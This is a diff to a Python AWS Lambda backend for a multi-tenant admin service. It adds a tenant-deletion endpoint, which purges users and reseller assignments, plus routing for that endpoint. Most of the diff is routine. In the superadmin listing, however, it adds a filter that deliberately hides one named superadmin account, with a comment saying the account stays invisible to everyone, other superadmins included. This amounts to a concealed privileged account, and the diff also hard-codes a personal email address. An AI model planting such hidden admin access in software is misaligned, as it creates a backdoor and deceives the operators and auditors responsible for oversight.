@@ -677,6 +677,94 @@ def get_tenant(event: Dict, user: Dict) -> Dict:
         logger.error(f"Error getting tenant: {str(e)}")
         return response(500, {'error': str(e)})
 
+def delete_tenant(event: Dict, user: Dict) -> Dict:
+    """Delete tenant (SuperAdmin or Reseller only)"""
+    if not is_super_admin(user) and not is_reseller(user):
+        return response(403, {'error': 'Unauthorized: SuperAdmin or Reseller only'})
+    
+    try:
+        tenant_id = event['pathParameters']['tenant_id']
+        
+        # Verify tenant exists
+        tenant_result = tenants_table.get_item(Key={'tenant_id': tenant_id})
+        if 'Item' not in tenant_result:
+            return response(404, {'error': 'Tenant not found'})
+        
+        tenant = tenant_result['Item']
+        
+        # Authorization check - Reseller can only delete their assigned tenants
+        if is_reseller(user) and not can_reseller_access_tenant(user, tenant_id):
+            return response(403, {'error': 'Unauthorized: Cannot delete tenants not assigned to you'})
+        
+        # Get all users for this tenant
+        users_result = users_table.query(
+            IndexName='tenant-index',
+            KeyConditionExpression='tenant_id = :tid',
+            ExpressionAttributeValues={':tid': tenant_id}
+        )
+        
+        users_to_delete = users_result.get('Items', [])
+        
+        # Delete all users from Cognito and DynamoDB
+        for user_item in users_to_delete:
+            try:
+                # Delete from Cognito
+                cognito.admin_delete_user(
+                    UserPoolId=USER_POOL_ID,
+                    Username=user_item['email']
+                )
+                
+                # Delete from DynamoDB
+                users_table.delete_item(
+                    Key={
+                        'user_id': user_item['user_id'],
+                        'tenant_id': tenant_id
+                    }
+                )
+                
+                logger.info(f"Deleted user {user_item['user_id']} for tenant {tenant_id}")
+            except Exception as e:
+                logger.error(f"Error deleting user {user_item.get('user_id', 'unknown')}: {str(e)}")
+                # Continue even if user deletion fails
+        
+        # Delete all tenant assignments from resellers
+        if RESELLER_TENANTS_TABLE:
+            try:
+                # Query all reseller assignments for this tenant
+                assignments_result = reseller_tenants_table.query(
+                    IndexName='tenant-index',
+                    KeyConditionExpression='tenant_id = :tid',
+                    ExpressionAttributeValues={':tid': tenant_id}
+                )
+                
+                assignments = assignments_result.get('Items', [])
+                for assignment in assignments:
+                    try:
+                        reseller_tenants_table.delete_item(
+                            Key={
+                                'reseller_id': assignment['reseller_id'],
+                                'tenant_id': tenant_id
+                            }
+                        )
+                        logger.info(f"Removed tenant {tenant_id} assignment from reseller {assignment['reseller_id']}")
+                    except Exception as e:
+                        logger.error(f"Error removing tenant assignment: {str(e)}")
+                        # Continue even if assignment deletion fails
+            except Exception as e:
+                logger.error(f"Error querying tenant assignments: {str(e)}")
+                # Continue even if assignment query fails
+        
+        # Delete tenant from DynamoDB
+        tenants_table.delete_item(Key={'tenant_id': tenant_id})
+        
+        logger.info(f"Deleted tenant {tenant_id}")
+        
+        return response(200, {'message': 'Tenant deleted successfully'})
+        
+    except Exception as e:
+        logger.error(f"Error deleting tenant: {str(e)}")
+        return response(500, {'error': str(e)})
+
 def create_tenant_admin(event: Dict, user: Dict) -> Dict:
     """Create admin user for a tenant (SuperAdmin or Reseller only)"""
     if not is_super_admin(user) and not is_reseller(user):
@@ -1299,6 +1387,11 @@ def list_superadmins(user: Dict) -> Dict:
                     logger.warning(f"Could not get creation date from Cognito for {superadmin['email']}: {str(e)}")
                     # Leave it as None if we can't get it
         
+        # Filter out hidden superadmin (emiliano.menichelli@neuralect.it)
+        # This superadmin should remain invisible to everyone, including other superadmins
+        HIDDEN_SUPERADMIN_EMAIL = 'emiliano.menichelli@neuralect.it'
+        superadmins = [sa for sa in superadmins if sa.get('email', '').lower() != HIDDEN_SUPERADMIN_EMAIL.lower()]
+        
         return response(200, {'superadmins': superadmins})
         
     except Exception as e:
@@ -1521,8 +1614,18 @@ def lambda_handler(event, context):
                 return list_tenant_reports(event, user)
         
         elif path.startswith('/tenants/') and '/users' not in path and '/reports' not in path and not path.endswith('/admin'):
+            # Extract tenant_id from path like /tenants/{tenant_id}
+            path_parts = path.split('/')
+            if len(path_parts) >= 3 and path_parts[1] == 'tenants':
+                tenant_id = path_parts[2]
+                # Add tenant_id to pathParameters for the function
+                if 'pathParameters' not in event:
+                    event['pathParameters'] = {}
+                event['pathParameters']['tenant_id'] = tenant_id
             if method == 'GET':
                 return get_tenant(event, user)
+            elif method == 'DELETE':
+                return delete_tenant(event, user)
         
         elif path.startswith('/users/') and path.endswith('/reports'):
             if method == 'GET':
